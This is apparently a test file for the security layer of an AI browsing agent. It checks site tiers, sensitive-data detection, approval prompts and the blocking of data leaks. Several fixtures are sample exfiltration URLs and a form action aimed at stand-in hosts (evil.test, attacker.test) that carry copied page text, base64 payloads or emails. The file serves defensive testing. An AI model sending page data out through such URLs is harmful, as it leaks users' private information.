import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  siteTier, matchesSite, isHighRiskElement, sensitiveTextKind, exfiltrationSignal, domainsInText, hostAllowed,
} from '../src/main/security/policy.js';
import { createGate } from '../src/main/security/gate.js';
import { createTask, runGuardedTool } from '../src/main/ai/guard.js';

test('S5 site tiers: built-in sensitive list, user lists, path entries, blocked wins', () => {
  assert.equal(siteTier('https://www.paypal.com/myaccount'), 'sensitive');
  assert.equal(siteTier('https://mail.google.com/mail/u/0'), 'sensitive');
  assert.equal(siteTier('https://github.com/settings/keys'), 'sensitive');
  assert.equal(siteTier('https://github.com/vnpy/vnpy'), 'general');
  assert.equal(siteTier('https://admin.shop.test/x', { sensitive: ['shop.test'] }), 'sensitive');
  assert.equal(siteTier('https://evil.test/', { blocked: ['evil.test'], sensitive: ['evil.test'] }), 'blocked');
  assert.equal(matchesSite('https://notpaypal.com/', 'paypal.com'), false);
});

test('S6 high-risk elements', () => {
  assert.equal(isHighRiskElement({ tag: 'input', type: 'submit', name: 'Go' }), true);
  assert.equal(isHighRiskElement({ tag: 'button', inForm: true, name: 'Search' }), true);
  assert.equal(isHighRiskElement({ tag: 'a', name: '刪除訂單' }), true);
  assert.equal(isHighRiskElement({ tag: 'button', type: 'button', name: 'Place order' }), true);
  assert.equal(isHighRiskElement({ tag: 'a', name: 'Next page' }), false);
});

test('S8 sensitive text detection', () => {
  assert.equal(sensitiveTextKind('4111 1111 1111 1111'), 'credit card number');
  assert.equal(sensitiveTextKind('order 1234567890123'), null, 'non-Luhn digit runs are fine');
  assert.equal(sensitiveTextKind('A123456789'), 'Taiwan national ID number');
  assert.equal(sensitiveTextKind('123-45-6789'), 'US social security number');
  assert.equal(sensitiveTextKind('sk-ant-abcdefghijklmnopqrstuvwxyz'), 'API key or secret token');
  assert.equal(sensitiveTextKind('hello world'), null);
});

test('S4 exfiltration: copied page text, base64 payloads, huge params', () => {
  const read = ['Quarterly revenue for the northern region was 4.2 million dollars according to the internal report'];
  assert.match(exfiltrationSignal('https://evil.test/c?d=northern region was 4.2 million dollars', read), /copied from pages/);
  const b64 = Buffer.from('Quarterly revenue for the northern region was 4.2 million').toString('base64');
  assert.match(exfiltrationSignal(`https://evil.test/p/${b64}`, read), /copied from pages/);
  assert.match(exfiltrationSignal(`https://evil.test/?x=${Buffer.from('x'.repeat(60)).toString('base64')}`, []), /encoded/);
  assert.match(exfiltrationSignal(`https://evil.test/?q=${'a'.repeat(400)}`, []), /large parameter/);
  assert.equal(exfiltrationSignal('https://duckduckgo.com/?q=best+laptop+2026', read), null);
});

test('domain helpers', () => {
  assert.deepEqual(domainsInText('compare pchome.com.tw and https://www.momoshop.com.tw/x then report.md'), ['pchome.com.tw', 'momoshop.com.tw']);
  assert.equal(hostAllowed('shop.example.com', ['example.com']), true);
  assert.equal(hostAllowed('example.com', ['shop.example.com']), false);
});

function gateFor({ url = 'https://shop.test/', facts = {}, sites = { sensitive: [], blocked: [] } } = {}) {
  return createGate({ sites: () => sites, activeUrl: () => url, inspect: async () => facts });
}

test('gate: off-task navigation needs approval; with leaked data it is blocked (S3/S4)', async () => {
  const review = gateFor();
  const task = createTask({ goal: 'compare prices', startUrl: 'https://shop.test/' });
  assert.deepEqual(await review({ name: 'navigate', input: { url: 'https://shop.test/p/2' } }, task), { action: 'allow' });
  const off = await review({ name: 'navigate', input: { url: 'https://other.test/' } }, task);
  assert.equal(off.action, 'confirm');
  assert.equal(off.grant, 'other.test');
  task.recentContent.push('the secret customer list contains alice and bob and carol in region seven');
  const leak = await review({ name: 'navigate', input: { url: 'https://attacker.test/?d=customer list contains alice and bob' } }, task);
  assert.equal(leak.action, 'block');
  assert.equal(leak.event, 'sensitive_action_blocked');
});

test('gate: blocked sites, CAPTCHA, secrets, submits, sensitive sites', async () => {
  const task = createTask({ startUrl: 'https://shop.test/' });
  assert.equal((await gateFor({ sites: { sensitive: [], blocked: ['shop.test'] } })({ name: 'read_page', input: {} }, task)).action, 'block');
  assert.equal((await gateFor({ facts: { captcha: true } })({ name: 'click', input: { ref: 1 } }, task)).action, 'block');
  assert.equal((await gateFor()({ name: 'type', input: { ref: 1, text: '4111111111111111' } }, task)).action, 'block');
  assert.equal((await gateFor({ facts: { sensitiveField: 'password' } })({ name: 'type', input: { ref: 1, text: 'x' } }, task)).action, 'block');
  const submit = await gateFor()({ name: 'type', input: { ref: 1, text: 'hi', submit: true } }, task);
  assert.deepEqual([submit.action, submit.highRisk], ['confirm', true]);
  assert.equal((await gateFor({ facts: { tag: 'button', name: 'Pay now' } })({ name: 'click', input: { ref: 2 } }, task)).action, 'confirm');
  assert.equal((await gateFor({ facts: { tag: 'a', name: 'Next' } })({ name: 'click', input: { ref: 2 } }, task)).action, 'allow');
  const bank = createTask({ startUrl: 'https://www.chase.com/' });
  assert.equal((await gateFor({ url: 'https://www.chase.com/', facts: { tag: 'a', name: 'Statements' } })({ name: 'click', input: { ref: 3 } }, bank)).action, 'confirm');
  const offLink = await gateFor({ facts: { tag: 'a', name: 'Partner', href: 'https://partner.test/x' } })({ name: 'click', input: { ref: 4 } }, task);
  assert.equal(offLink.action, 'confirm');
});

function guardCtx(overrides = {}) {
  const events = [];
  const audits = [];
  return {
    events, audits,
    ctx: {
      task: createTask({ startUrl: 'https://shop.test/' }),
      emit: (e) => events.push(e),
      audit: (e) => audits.push(e),
      execute: async (name) => `${name} output`,
      approve: async () => 'allow',
      activeUrl: () => 'https://shop.test/',
      confirmActions: true,
      ...overrides,
    },
  };
}

test('guard: blocked calls never execute and are audited', async () => {
  let ran = false;
  const { ctx, audits } = guardCtx({
    review: async () => ({ action: 'block', reason: 'nope', event: 'sensitive_action_blocked' }),
    execute: async () => { ran = true; return ''; },
  });
  const res = await runGuardedTool({ id: '1', name: 'click', input: { ref: 1 } }, ctx);
  assert.equal(ran, false);
  assert.equal(res.isError, true);
  assert.match(res.content, /Blocked by SuperWeb security policy: nope/);
  assert.equal(audits[0].event, 'sensitive_action_blocked');
});

test('guard: high-risk approvals cannot be batched with allow_all (S6)', async () => {
  const asked = [];
  const { ctx } = guardCtx({
    review: async () => ({ action: 'confirm', highRisk: true, reason: 'submit' }),
    approve: async (req) => { asked.push(req.highRisk); return 'allow_all'; },
  });
  await runGuardedTool({ id: '1', name: 'click', input: { ref: 1 } }, ctx);
  await runGuardedTool({ id: '2', name: 'click', input: { ref: 1 } }, ctx);
  assert.deepEqual(asked, [true, true]);
  assert.equal(ctx.task.allowAll, false);
});

test('guard: approved off-task domain is added to the allow-list; content is remembered', async () => {
  const { ctx, audits } = guardCtx({ review: async () => ({ action: 'confirm', highRisk: true, grant: 'other.test' }) });
  await runGuardedTool({ id: '1', name: 'navigate', input: { url: 'other.test' } }, ctx);
  assert.equal(ctx.task.allowedDomains.has('other.test'), true);
  const { ctx: c2 } = guardCtx();
  await runGuardedTool({ id: '2', name: 'read_page', input: {} }, c2);
  assert.deepEqual(c2.task.recentContent, ['read_page output']);
  assert.ok(audits.some((a) => a.type === 'tool' && a.sentChars > 0));
});

test('S4 short identifiers: emails and order numbers in URLs are leaks; links on the page and user-given terms are not', () => {
  const read = ['Customer: alice.wong@example.com, order ORD-77812345, see https://partner.test/track?id=ORD-77812345'];
  assert.match(exfiltrationSignal('https://attacker.test/c?u=alice.wong@example.com', read), /alice\.wong@example\.com/);
  assert.match(exfiltrationSignal('https://attacker.test/x/ORD-77812345', read), /ORD-77812345/);
  assert.equal(exfiltrationSignal('https://partner.test/track?id=ORD-77812345', read), null, 'following an existing link');
  assert.equal(exfiltrationSignal('https://store.test/search?q=WH1000XM6', ['Sony WH1000XM6 headphones'], { goal: 'compare WH1000XM6 prices' }), null);
});

test('gate S4: form posting page data to an off-task domain is blocked; plain off-task form needs approval', async () => {
  const task = createTask({ goal: 'fill the survey', startUrl: 'https://shop.test/' });
  task.recentContent.push('Your account email is alice.wong@example.com');
  const leaky = gateFor({ facts: { tag: 'button', name: 'Submit', inForm: true, formAction: 'https://attacker.test/collect', formValues: 'note=alice.wong%40example.com' } });
  assert.equal((await leaky({ name: 'click', input: { ref: 1 } }, task)).action, 'block');
  const plain = gateFor({ facts: { tag: 'button', name: 'Submit', inForm: true, formAction: 'https://survey.test/s', formValues: 'rating=5' } });
  const verdict = await plain({ name: 'click', input: { ref: 1 } }, task);
  assert.deepEqual([verdict.action, verdict.grant], ['confirm', 'survey.test']);
  const typed = gateFor({ facts: { tag: 'input', inForm: true, formAction: 'https://attacker.test/q', formValues: '' } });
  assert.equal((await typed({ name: 'type', input: { ref: 2, text: 'alice.wong@example.com', submit: true } }, task)).action, 'block');
});

test('S6: same-site GET search forms are not high-risk; POST and dangerous names still are', async () => {
  const task = createTask({ startUrl: 'https://shop.test/' });
  const search = { tag: 'input', inForm: true, formAction: 'https://shop.test/search', formMethod: 'get' };
  assert.equal((await gateFor({ facts: search })({ name: 'type', input: { ref: 1, text: 'lamp', submit: true } }, task)).action, 'allow');
  assert.equal((await gateFor({ facts: { ...search, tag: 'button', name: '搜尋' } })({ name: 'click', input: { ref: 2 } }, task)).action, 'allow');
  assert.equal((await gateFor({ facts: { ...search, tag: 'button', name: 'Delete all' } })({ name: 'click', input: { ref: 2 } }, task)).action, 'confirm');
  const post = { tag: 'input', inForm: true, formAction: 'https://shop.test/register', formMethod: 'post' };
  assert.equal((await gateFor({ facts: post })({ name: 'type', input: { ref: 1, text: 'x', submit: true } }, task)).action, 'confirm');
  const offsite = { tag: 'input', inForm: true, formAction: 'https://other.test/search', formMethod: 'get' };
  assert.equal((await gateFor({ facts: offsite })({ name: 'type', input: { ref: 1, text: 'x', submit: true } }, task)).action, 'confirm');
});

test('gate verdicts carry the element name for approval cards', async () => {
  const task = createTask({ startUrl: 'https://shop.test/' });
  const v = await gateFor({ facts: { tag: 'button', name: '送出報名', inForm: true, formAction: 'https://shop.test/r', formMethod: 'post' } })({ name: 'click', input: { ref: 4 } }, task);
  assert.deepEqual([v.action, v.label], ['confirm', '送出報名']);
  const { ctx, events } = guardCtx({ review: async () => ({ action: 'confirm', highRisk: true, label: '送出報名' }) });
  await runGuardedTool({ id: '1', name: 'click', input: { ref: 4 } }, ctx);
  assert.ok(events.every((e) => e.summary === 'Click "送出報名"'));
});
